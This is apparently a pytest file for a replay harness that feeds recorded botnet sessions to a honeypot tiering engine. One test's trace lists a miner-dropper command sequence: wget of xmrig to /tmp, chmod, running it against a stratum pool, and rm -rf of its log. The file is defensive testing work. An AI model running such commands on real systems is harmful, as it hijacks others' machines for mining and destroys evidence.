"""
Tests for Botnet Trace Replay Harness (harness/replay/test_replay_engine.py).
Pre-registered in SPEC.md Section 5.4, EVAL.md Section 5.5, and SAFETY.md.
"""

from __future__ import annotations

import os
import tempfile
import pytest
from gatekeeper.decision_api import DecisionEngine
from gatekeeper.visitor_memory import VisitorMemory
from harness.detector_runner import SafetyViolationError
from harness.replay.replay_engine import BotnetReplayEngine, AttackTrace


def test_replay_engine_safety_guard_blocks_remote_host():
    """Verify SAFETY.md: Replay engine strictly forbids external IP targets."""
    trace = AttackTrace(name="test", commands=["uname -a"])
    with pytest.raises(SafetyViolationError, match="External network target forbidden"):
        BotnetReplayEngine(target_host="198.51.100.1")


def test_replay_benign_scanner_probe():
    """Verify that a shallow scanner probe remains safely in T1 Lite."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        db_path = os.path.join(tmp_dir, "test_replay.db")
        memory = VisitorMemory(db_path=db_path)
        engine = DecisionEngine(db_path=db_path, memory=memory)

        replay = BotnetReplayEngine(decision_engine=engine)
        trace = AttackTrace(
            name="scanner_disconnect",
            visitor_ip="198.51.100.101",
            auth_success=False,
            failed_logins=1,
            commands=[],  # Disconnects without commands
        )

        result = replay.run_trace(trace)
        assert result["starting_tier"] == "T1"
        assert result["final_tier"] == "T1"
        assert result["escalated"] is False
        assert result["yield"] == 0.0


def test_replay_multistage_miner_dropper_escalates():
    """Verify that a complex miner dropper escalates upward to T2 or T3."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        db_path = os.path.join(tmp_dir, "test_replay2.db")
        memory = VisitorMemory(db_path=db_path)
        engine = DecisionEngine(db_path=db_path, memory=memory)

        replay = BotnetReplayEngine(decision_engine=engine)
        trace = AttackTrace(
            name="xmrig_dropper",
            visitor_ip="198.51.100.102",
            auth_success=True,
            failed_logins=2,
            has_pty=True,
            commands=[
                "uname -a",
                "cat /proc/cpuinfo",
                "wget http://pool.miner/xmrig -O /tmp/xmrig; chmod +x /tmp/xmrig",
                "/tmp/xmrig --donate-level 1 -o stratum+tcp://xmr.pool:3333 &",
                "rm -rf /tmp/xmrig.log",
            ],
            files=1,
        )

        result = replay.run_trace(trace)
        assert result["starting_tier"] == "T1"
        assert result["final_tier"] in ("T2", "T3")
        assert result["escalated"] is True
        assert result["yield"] > 0
        assert "T1082" in result["ttps"]
        assert "T1105" in result["ttps"]
        assert "T1496" in result["ttps"]


def test_replay_suite_batch_execution():
    """Verify running a full suite of pre-registered botnet traces."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        db_path = os.path.join(tmp_dir, "test_replay_batch.db")
        memory = VisitorMemory(db_path=db_path)
        engine = DecisionEngine(db_path=db_path, memory=memory)

        replay = BotnetReplayEngine(decision_engine=engine)
        report = replay.run_standard_suite()

        assert "traces_evaluated" in report
        assert report["traces_evaluated"] >= 3
        assert "overall_yield" in report
        assert "escalation_rate" in report
        assert report["overall_yield"] > 0
